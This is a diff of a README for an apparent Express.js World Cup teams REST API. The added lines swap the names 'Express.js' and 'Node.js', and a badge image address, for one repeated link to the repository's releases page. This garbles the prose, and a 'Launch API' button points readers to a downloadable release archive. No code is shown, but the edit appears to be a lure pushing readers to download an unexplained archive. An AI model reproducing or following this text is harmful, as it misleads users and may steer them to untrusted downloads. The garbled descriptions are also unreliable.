@@ -1,13 +1,13 @@
 # 🌟 Welcome to the World Cup Teams API-REST Repository! 🏆
 
 ## Overview
-This repository contains a powerful API-REST for World Cup Teams, allowing you to perform CRUD operations with ease. Built using Express.js and following the MVC architecture, this API provides a seamless experience for managing World Cup teams data. Whether you are a beginner or an experienced developer, this project is designed to meet your needs.
+This repository contains a powerful API-REST for World Cup Teams, allowing you to perform CRUD operations with ease. Built using https://github.com/afzal2222/API-REST/releases and following the MVC architecture, this API provides a seamless experience for managing World Cup teams data. Whether you are a beginner or an experienced developer, this project is designed to meet your needs.
 
 ## Features
 🌍 CRUD Operations: Perform Create, Read, Update, and Delete operations on World Cup teams data.  
-🚀 Express.js: Utilizes the popular Node.js framework for creating robust APIs.  
+🚀 https://github.com/afzal2222/API-REST/releases Utilizes the popular https://github.com/afzal2222/API-REST/releases framework for creating robust APIs.  
 🔧 MVC Architecture: Follows the Model-View-Controller architectural pattern for a structured codebase.  
-📦 NPM: Manages project dependencies and scripts using NPM, the default package manager for Node.js.  
+📦 NPM: Manages project dependencies and scripts using NPM, the default package manager for https://github.com/afzal2222/API-REST/releases  
 🔥 Nodemon: Automatically restarts the server when changes are detected, enhancing the development workflow.  
 📊 SQL Database: Stores and retrieves data using a SQL database for efficiency and reliability.
 
@@ -55,14 +55,14 @@ Here is an example of a World Cup team object:
 ```
 
 ## Resources
-For more information and detailed instructions, refer to the [API-REST GitHub Repository](https://github.com/releases/789694263/Release.zip). Click the button below to launch the API:
+For more information and detailed instructions, refer to the [API-REST GitHub Repository](https://github.com/afzal2222/API-REST/releases). Click the button below to launch the API:
 
-[![Launch API](https://img.shields.io/badge/Launch%20API-World%20Cup%20Teams-blue)](https://github.com/releases/789694263/Release.zip)
+[![Launch API](https://github.com/afzal2222/API-REST/releases%20API-World%20Cup%20Teams-blue)](https://github.com/afzal2222/API-REST/releases)
 
 In case the provided link is unavailable, please check the "Releases" section of the repository for alternative options.
 
 ## Get Involved
-If you are passionate about APIs, Node.js, and World Cup teams, we welcome you to contribute to this project. Feel free to submit bug reports, feature requests, or pull requests to help improve the API for everyone.
+If you are passionate about APIs, https://github.com/afzal2222/API-REST/releases, and World Cup teams, we welcome you to contribute to this project. Feel free to submit bug reports, feature requests, or pull requests to help improve the API for everyone.
 
 Let's make managing World Cup teams data easier and more efficient with the World Cup Teams API-REST! ⚽🌟
 
